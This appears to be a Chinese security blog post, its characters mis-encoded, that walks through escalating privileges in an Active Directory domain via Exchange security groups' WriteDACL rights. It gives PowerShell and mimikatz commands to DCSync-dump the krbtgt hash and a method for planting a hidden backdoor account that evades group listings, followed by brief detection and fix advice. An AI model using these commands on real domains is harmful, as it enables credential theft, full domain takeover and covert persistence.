I"´B<h2 id="0x00">0x00</h2>
<hr />

<p>æœ€è¿‘å­¦åˆ°çš„ä¸€ä¸ªåŸŸç¯å¢ƒä¸‹çš„ææƒæŠ€å·§ï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼Œå®‰è£…Exchangeåä¼šæ·»åŠ ä¸€ä¸ªåä¸º<code class="language-plaintext highlighter-rouge">Microsoft Exchange Security Groups</code>çš„OUï¼Œå…¶ä¸­åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šçš„ç»„ï¼š<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>å’Œ<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code>ï¼Œå¦‚æœè·å¾—äº†è¿™ä¸¤ä¸ªç»„å†…ä»»æ„ç”¨æˆ·çš„æ§åˆ¶æƒé™ï¼Œå°±èƒ½å¤Ÿç»§æ‰¿è¯¥ç»„çš„WriteDACLæƒé™ï¼Œè¿›è€Œä¿®æ”¹åŸŸå¯¹è±¡çš„ACLï¼Œæœ€ç»ˆå®ç°åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashã€‚æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨åŸŸç”¨æˆ·krbtgtçš„hashåˆ¶ä½œGolden Ticketï¼Œç™»å½•åŸŸæ§åˆ¶å™¨ï¼Œè·å¾—å¯¹æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒé™ã€‚</p>

<p>å­¦ä¹ èµ„æ–™ï¼š</p>

<p>https://github.com/gdedrouas/Exchange-AD-Privesc</p>

<p>æœ¬æ–‡å°†ä¼šè®°å½•å¤ç°è¿‡ç¨‹ï¼Œä»‹ç»åˆ©ç”¨è¿™ä¸ªæœºåˆ¶å»ºç«‹ææƒåé—¨çš„æ–¹æ³•ï¼Œè¯¦ç»†ä»‹ç»ä½¿ç”¨PowerViewå¯¹åŸŸå¯¹è±¡ACLçš„æ“ä½œæ–¹æ³•ï¼Œæœ€åç»™å‡ºæ£€æµ‹å’Œé˜²å¾¡å»ºè®®ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>ææƒæ–¹æ³•å¤ç°</li>
  <li>å»ºç«‹ææƒåé—¨çš„æ–¹æ³•</li>
  <li>æ£€æµ‹å’Œé˜²å¾¡å»ºè®®</li>
</ul>

<h2 id="0x02-ææƒæ–¹æ³•å¤ç°">0x02 ææƒæ–¹æ³•å¤ç°</h2>
<hr />

<p>æµ‹è¯•ç¯å¢ƒï¼š</p>

<ul>
  <li>Server2012R2 x64</li>
  <li>Exchange 2013</li>
</ul>

<h3 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h3>

<h4 id="1å¸¸ç”¨ç¼©å†™è¯">1.å¸¸ç”¨ç¼©å†™è¯</h4>

<ul>
  <li>DN:Distinguished Name</li>
  <li>CN:Common Name</li>
  <li>OU:Organizational Unit</li>
  <li>DC:Domain Component</li>
  <li>ACE:Access Control Entries</li>
  <li>ACL:Access Control List</li>
</ul>

<p>LDAPè¿æ¥æœåŠ¡å™¨çš„è¿æ¥å­—ä¸²æ ¼å¼ä¸ºï¼šldap://servername/DN</p>

<p>å…¶ä¸­DNæœ‰ä¸‰ä¸ªå±æ€§ï¼Œåˆ†åˆ«æ˜¯CNã€OUå’ŒDC</p>

<h4 id="2å®‰è£…exchangeåé»˜è®¤ä¼šè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªåä¸ºmicrosoft-exchange-security-groupsçš„ou">2.å®‰è£…Exchangeåé»˜è®¤ä¼šè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªåä¸ºMicrosoft Exchange Security Groupsçš„OU</h4>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-1.png" alt="Alt text" /></p>

<p>å…¶ä¸­åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šçš„ç»„ï¼š<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>å’Œ<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code></p>

<p><code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>æ˜¯<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code>çš„æˆå‘˜</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-2.png" alt="Alt text" /></p>

<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code>å¯¹å®‰è£…Exchangeçš„åŸŸå¯¹è±¡å…·æœ‰WriteDACLæƒé™ï¼Œé‚£ä¹ˆ<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ä¹Ÿä¼šç»§æ‰¿è¿™ä¸ªæƒé™</p>

<h4 id="3å¦‚æœå¯¹åŸŸå¯¹è±¡å…·æœ‰writedaclæƒé™å°±èƒ½å¤Ÿä¸ºæŒ‡å®šåŸŸç”¨æˆ·æ·»åŠ aceä½¿å…¶è·å¾—åˆ©ç”¨dcsyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æƒé™æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨åŸŸç”¨æˆ·krbtgtçš„hashåˆ¶ä½œgolden-ticketç™»å½•åŸŸæ§åˆ¶å™¨è·å¾—å¯¹æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒé™">3.å¦‚æœå¯¹åŸŸå¯¹è±¡å…·æœ‰WriteDACLæƒé™ï¼Œå°±èƒ½å¤Ÿä¸ºæŒ‡å®šåŸŸç”¨æˆ·æ·»åŠ ACEï¼Œä½¿å…¶è·å¾—åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æƒé™ï¼Œæ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨åŸŸç”¨æˆ·krbtgtçš„hashåˆ¶ä½œGolden Ticketï¼Œç™»å½•åŸŸæ§åˆ¶å™¨ï¼Œè·å¾—å¯¹æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒé™</h4>

<p>è¯¦ç»†åˆ©ç”¨æ–¹æ³•å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">ã€ŠåŸŸæ¸—é€â€”â€”DCSyncã€‹</a></p>

<h4 id="4ä½¿ç”¨powerviewèƒ½å¤Ÿå¯¹åŸŸå¯¹è±¡çš„aclè¿›è¡Œæ“ä½œ">4.ä½¿ç”¨PowerViewèƒ½å¤Ÿå¯¹åŸŸå¯¹è±¡çš„ACLè¿›è¡Œæ“ä½œ</h4>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯PowerViewå­˜åœ¨ä¸¤ä¸ªç‰ˆæœ¬ï¼Œæœ‰äº›åŠŸèƒ½åªåœ¨devç‰ˆæœ¬ä¸­æ”¯æŒï¼Œä¸¤ä¸ªç‰ˆæœ¬çš„åœ°å€åˆ†åˆ«ä¸ºï¼š</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<p>è¿™ä¸ªç»†èŠ‚åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder">ã€ŠåŸŸæ¸—é€â€”â€”AdminSDHolderã€‹</a>æœ‰è¿‡ä»‹ç»</p>

<h3 id="å®é™…æµ‹è¯•">å®é™…æµ‹è¯•</h3>

<p>è¿™é‡Œä»¥<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ä½œä¸ºæµ‹è¯•å¯¹è±¡ï¼Œæµ‹è¯•ç”¨æˆ·testaçš„å£ä»¤å·²ç»è·å¾—ï¼Œå…ˆå°†æµ‹è¯•ç”¨æˆ·testaæ·»åŠ åˆ°<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ä¸­</p>

<p>Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
</code></pre></div></div>

<p>å¯¹äºæœªå®‰è£…Active Directoryæ¨¡å—çš„Windowsç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯¼å…¥Active Directoryæ¨¡å—ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Microsoft.ActiveDirectory.Management.dll</code>åœ¨å®‰è£…powershellæ¨¡å—Active Directoryåç”Ÿæˆï¼Œæˆ‘å·²ç»æå–å‡ºæ¥å¹¶ä¸Šä¼ è‡³githubï¼š</p>

<p>https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>

<p>æ·»åŠ æˆåŠŸåå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-1.png" alt="Alt text" /></p>

<p>æ¥ä¸‹æ¥ï¼Œåœ¨å¦ä¸€å°åŸŸå†…ä¸»æœºä¸Šå®Œæˆæ‰€æœ‰ææƒçš„æ“ä½œ</p>

<h4 id="1ç™»å½•ç”¨æˆ·testa">1.ç™»å½•ç”¨æˆ·testa</h4>

<p>cmdï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /user:test\testa cmd
</code></pre></div></div>

<p>å¦‚æœåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡å°†æµ‹è¯•ç”¨æˆ·testaæ·»åŠ åˆ°<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ä¸­ï¼Œé‚£ä¹ˆç”¨æˆ·testaéœ€è¦é‡æ–°ç™»å½•æ‰èƒ½ç»§æ‰¿WriteDACLæƒé™</p>

<p>æŸ¥çœ‹ç”¨æˆ·testaæ‰€åœ¨çš„ç»„ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /groups
</code></pre></div></div>

<p>å‘ç°ç”¨æˆ·testaæˆåŠŸåŠ å…¥<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ç»„ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-2.png" alt="Alt text" /></p>

<h4 id="2ä½¿ç”¨mimikatzçš„dcsyncåŠŸèƒ½å¯¼å‡ºç”¨æˆ·krbtgtçš„hash">2.ä½¿ç”¨mimikatzçš„DCSyncåŠŸèƒ½å¯¼å‡ºç”¨æˆ·krbtgtçš„hash</h4>

<p>cmdï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
</code></pre></div></div>

<p>æˆåŠŸå¯¼å‡ºç”¨æˆ·krbtgtçš„hashï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-3.png" alt="Alt text" /></p>

<p>æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨åŸŸç”¨æˆ·krbtgtçš„hashåˆ¶ä½œGolden Ticketï¼Œç™»å½•åŸŸæ§åˆ¶å™¨ï¼Œè·å¾—å¯¹æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒé™</p>

<p>ææƒæˆåŠŸ</p>

<p>ç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œå¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š</p>

<p>å¦‚æœè·å¾—äº†ä»¥ä¸‹ä¸‰ä¸ªç»„å†…ä»»æ„ç”¨æˆ·çš„æƒé™ï¼Œéƒ½èƒ½å¤Ÿåˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hash</p>

<p>ç»„åå¦‚ä¸‹ï¼š</p>

<ul>
  <li>Exchange Trusted Subsystem</li>
  <li>Exchange Windows Permission</li>
  <li>Organization Management</li>
</ul>

<h2 id="0x03-å»ºç«‹ææƒåé—¨çš„æ–¹æ³•">0x03 å»ºç«‹ææƒåé—¨çš„æ–¹æ³•</h2>
<hr />

<p>å¦‚æœè·å¾—äº†æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒé™ï¼Œå¯ä»¥åˆ©ç”¨Exchangeä¸­çš„ACLä½œä¸ºåŸŸææƒçš„åé—¨</p>

<h3 id="æ–¹æ³•1ç›´æ¥åœ¨exchangeçš„ä¸‰ä¸ªç»„å†…æ·»åŠ åé—¨ç”¨æˆ·">æ–¹æ³•1ï¼šç›´æ¥åœ¨Exchangeçš„ä¸‰ä¸ªç»„å†…æ·»åŠ åé—¨ç”¨æˆ·</h3>

<p>è¿™é‡Œä»¥<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ä¸ºä¾‹</p>

<p>Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
</code></pre></div></div>

<p>ä½†æ˜¯ä¸å¤Ÿéšè”½ï¼Œå¾ˆå®¹æ˜“è¢«å‘ç°æ·»åŠ çš„ç”¨æˆ·</p>

<p>æŸ¥çœ‹çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Exchange Trusted Subsystem" /domain
</code></pre></div></div>

<h3 id="æ–¹æ³•2åªæ·»åŠ ç‰¹å®šç”¨æˆ·å¯¹exchangeä¸­ä¸‰ä¸ªç»„aclçš„æ§åˆ¶æƒé™">æ–¹æ³•2ï¼šåªæ·»åŠ ç‰¹å®šç”¨æˆ·å¯¹Exchangeä¸­ä¸‰ä¸ªç»„ACLçš„æ§åˆ¶æƒé™</h3>

<p>è¿™é‡Œä»¥<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ä¸ºä¾‹</p>

<h4 id="1é¦–å…ˆéœ€è¦æ‰¾åˆ°exchange-trusted-subsystemçš„dndistinguished-name">1.é¦–å…ˆéœ€è¦æ‰¾åˆ°Exchange Trusted Subsystemçš„DN(Distinguished Name)</h4>

<p>éœ€è¦ä½¿ç”¨Powerviewçš„devç‰ˆæœ¬ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<p>æŸ¥çœ‹æ‰€æœ‰DNçš„Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-DomainObject -Properties distinguishedname |fl
</code></pre></div></div>

<p>æ‰¾åˆ°<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>çš„DNä¸ºï¼š<code class="language-plaintext highlighter-rouge">CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com</code></p>

<h4 id="2æŸ¥çœ‹exchange-trusted-subsystemçš„acl">2.æŸ¥çœ‹Exchange Trusted Subsystemçš„ACL</h4>

<p>Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com"
</code></pre></div></div>

<h4 id="3è·å¾—exchange-trusted-subsystemçš„åŸå§‹æ•°æ®">3.è·å¾—Exchange Trusted Subsystemçš„åŸå§‹æ•°æ®</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
</code></pre></div></div>

<h4 id="4æ·»åŠ åé—¨ç”¨æˆ·testbå¯¹exchange-trusted-subsystemçš„å®Œå…¨è®¿é—®æƒé™">4.æ·»åŠ åé—¨ç”¨æˆ·testbå¯¹Exchange Trusted Subsystemçš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<p><strong>è¡¥å……ï¼š</strong></p>

<p>ç§»é™¤åé—¨ç”¨æˆ·testbå¯¹<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>çš„å®Œå…¨è®¿é—®æƒé™ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<h4 id="5æŸ¥çœ‹ç”¨æˆ·testbçš„sid">5.æŸ¥çœ‹ç”¨æˆ·testbçš„sid</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser testb
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-1.png" alt="Alt text" /></p>

<p>ç”¨æˆ·testbçš„objectsidä¸º<code class="language-plaintext highlighter-rouge">S-1-5-21-1672228480-1396590849-334771951-2105</code></p>

<h4 id="6æŸ¥çœ‹å±äºæ–°æ·»åŠ ç”¨æˆ·testbçš„ace">6.æŸ¥çœ‹å±äºæ–°æ·»åŠ ç”¨æˆ·testbçš„ACE</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" | Where-Object {$_.SecurityIdentifier -eq "S-1-5-21-1672228480-1396590849-334771951-2105"}
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-2.png" alt="Alt text" /></p>

<p>è‡³æ­¤ï¼Œåé—¨å®‰è£…æˆåŠŸ</p>

<p>æ­¤æ—¶æŸ¥çœ‹<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ç»„çš„ç”¨æˆ·ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Exchange Trusted Subsystem" /domain
</code></pre></div></div>

<p>æ— æ³•å‘ç°åé—¨ç”¨æˆ·testb</p>

<h3 id="åé—¨å¯åŠ¨æ–¹æ³•">åé—¨å¯åŠ¨æ–¹æ³•</h3>

<h4 id="1åœ¨å¦ä¸€å°åŸŸå†…ä¸»æœºä¸Šç™»å½•ç”¨æˆ·testb">1.åœ¨å¦ä¸€å°åŸŸå†…ä¸»æœºä¸Šç™»å½•ç”¨æˆ·testb</h4>

<p>cmdï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /user:test\testb cmd
</code></pre></div></div>

<h4 id="2å°†ç”¨æˆ·testbæ·»åŠ åˆ°exchange-trusted-subsystem">2.å°†ç”¨æˆ·testbæ·»åŠ åˆ°Exchange Trusted Subsystem</h4>

<p>ç”±äºç”¨æˆ·testbæœ‰å¯¹<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>çš„å®Œå…¨è®¿é—®æƒé™ï¼Œæ‰€ä»¥èƒ½å¤Ÿå°†è‡ªå·±æ·»åŠ åˆ°<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>ç»„ä¸­</p>

<p>Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb
</code></pre></div></div>

<h4 id="3é‡æ–°ç™»å½•ç”¨æˆ·testb">3.é‡æ–°ç™»å½•ç”¨æˆ·testb</h4>

<p>cmdï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /user:test\testb cmd
</code></pre></div></div>

<h4 id="4ä½¿ç”¨mimikatzçš„dcsyncåŠŸèƒ½å¯¼å‡ºç”¨æˆ·krbtgtçš„hash">4.ä½¿ç”¨mimikatzçš„DCSyncåŠŸèƒ½å¯¼å‡ºç”¨æˆ·krbtgtçš„hash</h4>

<p>cmdï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
</code></pre></div></div>

<h4 id="5å°†ç”¨æˆ·testbä»exchange-trusted-subsystemç»„ä¸­ç§»é™¤">5.å°†ç”¨æˆ·testbä»Exchange Trusted Subsystemç»„ä¸­ç§»é™¤</h4>

<p>Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
Remove-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb -confirm:$false
</code></pre></div></div>

<p>ç”±äºç”¨æˆ·testbå…·æœ‰å¯¹<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>çš„å®Œå…¨è®¿é—®æƒé™ï¼Œæ‰€ä»¥èƒ½å¤Ÿåå¤å°†è‡ªå·±æ·»åŠ æˆ–æ˜¯ç§»é™¤<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code></p>

<h2 id="0x04-æ£€æµ‹å’Œé˜²å¾¡å»ºè®®">0x04 æ£€æµ‹å’Œé˜²å¾¡å»ºè®®</h2>
<hr />

<p>ä»æ ¹æºä¸Šä¿®å¤ï¼šå»é™¤<code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code>çš„WriteDACLæƒé™</p>

<p>å¯ä¾›å‚è€ƒçš„è„šæœ¬ï¼š</p>

<p>https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1</p>

<p>æ—¥å¿—æ£€æµ‹ï¼š</p>

<p>éœ€è¦å¼€å¯Active Directoryçš„é«˜çº§å®‰å…¨å®¡æ ¸ç­–ç•¥ï¼Œå½“åŸŸå¯¹è±¡çš„ACLè¢«ä¿®æ”¹åï¼Œå°†äº§ç”ŸIDä¸º5136çš„æ—¥å¿—</p>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/</p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡è®°å½•äº†ä½¿ç”¨Exchangeä¸­ç‰¹å®šACLè¿›è¡Œææƒçš„è¿‡ç¨‹ï¼Œåˆ†æäº†åˆ©ç”¨æ¡ä»¶ï¼Œç»“åˆè¿™ä¸ªæœºåˆ¶ä»‹ç»äº†ä¸€ä¸ªææƒåé—¨çš„åˆ©ç”¨æ–¹æ³•ï¼Œæœ€åç»™å‡ºæ£€æµ‹å’Œé˜²å¾¡å»ºè®®ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET